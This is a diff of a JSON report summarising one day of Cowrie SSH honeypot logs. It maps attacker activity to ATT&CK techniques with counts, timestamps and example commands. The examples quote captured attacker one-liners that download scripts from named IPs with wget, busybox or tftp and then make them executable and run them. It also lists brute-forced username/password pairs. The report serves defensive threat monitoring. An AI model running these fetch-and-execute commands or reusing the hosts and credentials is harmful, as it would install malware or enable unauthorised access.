@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-05 17:05:11",
+  "generated": "2026-09-05 18:02:45",
   "totals": {
-    "commands": 405,
-    "login_failed": 3012,
-    "login_success": 111,
-    "sessions": 3079
+    "commands": 436,
+    "login_failed": 3060,
+    "login_success": 118,
+    "sessions": 3125
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3012,
+      "count": 3060,
       "examples": [
         "leo / leo",
         "root / Ss112233",
@@ -21,14 +21,14 @@
         "oracle / Bmw_20!_^"
       ],
       "first": "2026-09-05T00:00:02.121215Z",
-      "last": "2026-09-05T17:03:24.626491Z",
-      "unique_ips": 229
+      "last": "2026-09-05T18:00:50.414252Z",
+      "unique_ips": 236
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 157,
+      "count": 172,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-09-05T00:08:30.768655Z",
-      "last": "2026-09-05T14:48:56.233885Z",
-      "unique_ips": 17
+      "last": "2026-09-05T17:39:43.369338Z",
+      "unique_ips": 18
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 111,
+      "count": 118,
       "examples": [
         "11111111 / 11111111",
         "centos / centos22",
@@ -53,14 +53,14 @@
         "blank / 123"
       ],
       "first": "2026-09-05T00:01:25.714320Z",
-      "last": "2026-09-05T16:58:23.250356Z",
-      "unique_ips": 101
+      "last": "2026-09-05T17:47:06.704415Z",
+      "unique_ips": 108
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 55,
+      "count": 59,
       "examples": [
         "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
         "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
@@ -69,8 +69,8 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-09-05T00:08:30.768655Z",
-      "last": "2026-09-05T14:48:56.233885Z",
-      "unique_ips": 15
+      "last": "2026-09-05T17:39:43.369338Z",
+      "unique_ips": 16
     },
     {
       "id": "T1082",
@@ -92,15 +92,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 14,
+      "count": 15,
       "examples": [
         "id",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-05T00:08:30.469030Z",
-      "last": "2026-09-05T14:48:20.152514Z",
-      "unique_ips": 14
+      "last": "2026-09-05T17:39:06.175714Z",
+      "unique_ips": 15
     },
     {
       "id": "T1059.004",
@@ -157,51 +157,51 @@
       64
     ],
     [
+      "/bin/busybox",
+      23
+    ],
+    [
       "shell",
-      21
+      22
     ],
     [
       "sh",
-      21
+      22
     ],
     [
       "system",
-      19
-    ],
-    [
-      "/bin/busybox",
-      16
+      20
     ],
     [
       "enable",
-      14
+      15
     ],
     [
       "linuxshell",
-      11
+      12
     ],
     [
       "enablelinuxshell",
-      10
+      11
     ],
     [
       "ping ;sh",
-      10
+      11
     ],
     [
       "cd /proc && cat self/cmdline",
-      10
+      11
     ],
     [
       "/bin/busybox UNSTABLE",
       5
     ],
     [
-      "/bin/busybox TOKEN",
-      2
+      "busybox",
+      3
     ],
     [
-      "busybox",
+      "/bin/busybox TOKEN",
       2
     ],
     [
